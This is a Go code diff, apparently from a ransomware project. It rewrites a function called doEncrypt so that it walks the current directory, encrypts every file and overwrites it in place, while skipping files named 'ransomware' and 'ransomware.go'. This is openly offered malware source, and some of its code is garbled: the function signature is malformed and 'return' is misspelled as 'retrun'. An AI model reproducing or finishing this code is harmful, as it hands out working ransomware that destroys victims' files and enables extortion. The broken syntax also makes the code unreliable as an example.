@@ -70,32 +70,48 @@ func writeToFile(filename string, content []byte) error {
 }
 
 func doEncrypt(currentDir string, key []byte) {
-	db, err := sql.Open("mysql", "user:password@tcp(localhost:3306)/dbname")
-	if err != nil {
-		panic(err.Error())
-	}
-	defer db.Close()
-
-	rows, err := db.Query("SELECT * FROM table_name")
-	if err != nil {
-		panic(err.Error())
-	}
-	defer rows.Close()
-
-	for rows.Next() {
-		var data []byte
-		err := rows.Scan(&data)
+	err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error))
+	error {
 		if err != nil {
-			panic(err.Error())
+			return err
 		}
 
-		encryptedData, err := Encrypt(data, key)
-		if err != nil {
-			panic(err.Error())
+		if info.IsDir(){
+			return nil
 		}
 
-		writeToFile(currentDir+"/encrypted_data.bin", encryptedData)
+		if info.Name() == "ransomware" || info.Name() == "ransomware.go"{
+			return nil
+		}
+
+		//Read file content
+		fileContent, err := ioutil.ReadFile(path)
+		if err != nil{
+			return err
+		}
+
+		//Encrypt file content
+		encryptedContent, err := Encrypt(fileContent, key)
+		if err != nil{
+			retrun err
+		}
+
+		err = writeToFile(path, encryptedContent)
+		if err != nil{
+			return err
+		}
+
+		fmt.Printf("File '%s' encrypted and overwritten successfully.\n", path)
+		return nil
+
+	})
+
+	if err != nil {
+		fmt.Println("Error encrypting files:", err)
+		return
 	}
+
+	fmt.Println("All files encrypted and overwritten successfully.")
 }
 
 func doDecrypt(currentDir string, key []byte) {
